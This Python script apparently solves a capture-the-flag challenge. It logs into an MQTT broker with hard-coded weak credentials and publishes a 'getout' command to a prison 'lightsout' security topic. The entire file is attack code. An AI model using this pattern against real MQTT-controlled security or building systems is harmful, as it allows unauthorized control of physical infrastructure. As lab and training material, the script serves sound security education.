#!/usr/bin/env python3

import paho.mqtt.client as mqtt
import time
import sys

# --- Player Configuration ---
# IMPORTANT: You MUST replace the placeholder values below
#            with the information found in the prison systems!
TARGET_TOPIC = "prison/security/lightsout/"  # EDIT THIS: The specific topic to publish to.
COMMAND_PAYLOAD = "getout"          # EDIT THIS: The specific command phrase.
# ---------------------------

# --- MQTT Configuration (Should match the CTF setup) ---
BROKER_HOST = "198.18.128.11" # IP of the Mosquitto broker
BROKER_PORT = 1883
MQTT_USERNAME = "iotuser"     # Username for MQTT
MQTT_PASSWORD = "iot"         # Password for MQTT

# --- MQTT Callbacks ---
def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print(f"[+] Connected successfully to MQTT broker: {BROKER_HOST}")
        # Immediately try to publish after connecting
        publish_command(client)
    else:
        print(f"[!] MQTT Connection failed with code {rc}. Check broker details and credentials.")
        client.disconnect() # Disconnect if connection failed

def on_publish(client, userdata, mid):
    print(f"[+] Command '{COMMAND_PAYLOAD}' successfully published to '{TARGET_TOPIC}' (MID: {mid}).")
    print("[*] Check the hidden website for status change!")
    # Disconnect after successful publish
    time.sleep(0.5) # Short delay to ensure message is sent
    client.disconnect()

def on_disconnect(client, userdata, rc):
     # This might be called normally after publish or on error
     if rc != 0:
         print(f"\n[!] Disconnected unexpectedly from MQTT broker (code: {rc}).")
     print("[*] MQTT connection closed.")


def publish_command(client):
     """Publishes the command payload to the target topic."""
     print(f"[*] Sending command '{COMMAND_PAYLOAD}' to topic '{TARGET_TOPIC}'...")
     try:
         # Use QoS 1 to make it more likely the broker receives it
         result, mid = client.publish(TARGET_TOPIC, payload=COMMAND_PAYLOAD, qos=1)
         if result != mqtt.MQTT_ERR_SUCCESS:
             print(f"[!] Failed to publish command. Error code: {result}")
             client.disconnect() # Disconnect on publish failure
         # Success is handled by on_publish callback
     except Exception as e:
         print(f"[!] Error publishing command: {e}")
         client.disconnect()


# --- Main Execution ---
if __name__ == "__main__":
    print("--- Prison Break: Lights Out Trigger ---")

    # Basic check if placeholders were edited
    if "CHANGE_ME" in TARGET_TOPIC or "CHANGE_ME" in COMMAND_PAYLOAD:
        print("\n[ERROR] Please edit the script first!")
        print("        Replace the placeholder values for TARGET_TOPIC and COMMAND_PAYLOAD")
        print("        with the information found during your recon.")
        sys.exit(1)

    # Further validation could be added here if needed (e.g., check topic format)
    print(f"[*] Target Topic:     {TARGET_TOPIC}")
    print(f"[*] Command Payload:  {COMMAND_PAYLOAD}")

    client = mqtt.Client(client_id=f"attacker-lightsout-{time.time()}") # Unique client ID
    client.on_connect = on_connect
    client.on_publish = on_publish # Callback when publish completes (for QoS>0)
    client.on_disconnect = on_disconnect

    if MQTT_USERNAME and MQTT_PASSWORD:
        client.username_pw_set(MQTT_USERNAME, MQTT_PASSWORD)

    try:
        print(f"[*] Connecting to broker {BROKER_HOST}:{BROKER_PORT}...")
        client.connect(BROKER_HOST, BROKER_PORT, 60)

        # loop_forever() will block until disconnect is called (e.g., in callbacks)
        client.loop_forever()

    except ConnectionRefusedError:
         print(f"\n[!] ERROR: Connection refused. Broker might be down or inaccessible.")
    except Exception as e:
        print(f"\n[!] An unexpected error occurred: {e}")
    finally:
        # Loop may have already stopped, but ensure it is stopped.
        client.loop_stop(force=True) # Force stop if still running
        print("[*] Script finished.")
